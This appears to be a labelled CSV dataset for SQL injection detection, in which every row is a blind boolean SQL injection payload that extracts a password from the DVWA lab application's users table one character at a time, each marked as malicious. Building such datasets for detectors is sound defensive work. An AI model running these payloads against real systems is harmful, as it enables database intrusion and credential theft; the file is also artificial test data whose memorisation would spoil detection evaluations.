input_text,Label,classification, ,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),10,1))>52-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),10,1))>53-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),11,1))>47-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),11,1))>87-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),11,1))>107-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),11,1))>97-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),11,1))>102-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),11,1))>99-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),11,1))>98-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),12,1))>96-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),12,1))>112-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),12,1))>104-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),12,1))>100-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),12,1))>98-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),12,1))>97-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),13,1))>96-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),13,1))>112-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),13,1))>104-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),13,1))>100-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),13,1))>102-- kbvC",1,Yes,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),13,1))>101-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),14,1))>96-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),14,1))>48-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),14,1))>72-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),14,1))>60-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),14,1))>54-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),14,1))>51-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),14,1))>52-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),15,1))>47-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),15,1))>87-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),15,1))>67-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),15,1))>57-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),15,1))>52-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),15,1))>49-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),15,1))>48-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),16,1))>47-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),16,1))>87-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),16,1))>107-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),16,1))>97-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),16,1))>102-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),16,1))>99-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),16,1))>98-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),17,1))>96-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),17,1))>112-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),17,1))>104-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),17,1))>100-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),17,1))>98-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),17,1))>97-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),18,1))>96-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),18,1))>112-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),18,1))>104-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),18,1))>100-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),18,1))>98-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),18,1))>99-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),19,1))>96-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),19,1))>112-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),19,1))>104-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),19,1))>100-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),19,1))>102-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),19,1))>101-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),20,1))>96-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),20,1))>48-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),20,1))>72-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),20,1))>60-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),20,1))>54-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),20,1))>51-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),20,1))>49-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),20,1))>50-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),21,1))>47-- kbvC",1,Yes,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),21,1))>87-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),21,1))>107-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),21,1))>97-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),21,1))>102-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),21,1))>99-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),21,1))>100-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),22,1))>96-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),22,1))>112-- kbvC",1,Yes,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),22,1))>104-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),22,1))>100-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),22,1))>102-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),22,1))>101-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),23,1))>96-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),23,1))>48-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),23,1))>72-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),23,1))>60-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),23,1))>54-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),23,1))>51-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),23,1))>52-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),23,1))>53-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),24,1))>47-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),24,1))>87-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),24,1))>107-- kbvC",1,Yes,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),24,1))>97-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),24,1))>102-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),24,1))>99-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),24,1))>98-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),25,1))>96-- kbvC",1,Yes,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),25,1))>48-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),25,1))>72-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),25,1))>60-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),25,1))>54-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),25,1))>57-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),25,1))>55-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),26,1))>47-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),26,1))>87-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),26,1))>67-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),26,1))>57-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),26,1))>52-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),26,1))>49-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),26,1))>48-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),27,1))>47-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),27,1))>87-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),27,1))>107-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),27,1))>97-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),27,1))>102-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),27,1))>99-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),27,1))>100-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),27,1))>101-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),28,1))>96-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),28,1))>48-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),28,1))>72-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),28,1))>60-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),28,1))>54-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),28,1))>57-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),28,1))>55-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),28,1))>56-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),29,1))>47-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),29,1))>87-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),29,1))>107-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),29,1))>97-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),29,1))>102-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),29,1))>99-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),29,1))>100-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),29,1))>101-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),30,1))>96-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),30,1))>48-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),30,1))>72-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),30,1))>60-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),30,1))>54-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),30,1))>57-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),30,1))>55-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),30,1))>56-- kbvC",1,Yes,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),31,1))>47-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),31,1))>87-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),31,1))>107-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),31,1))>97-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),31,1))>102-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),31,1))>99-- kbvC",1,Yes.,,,,,,,
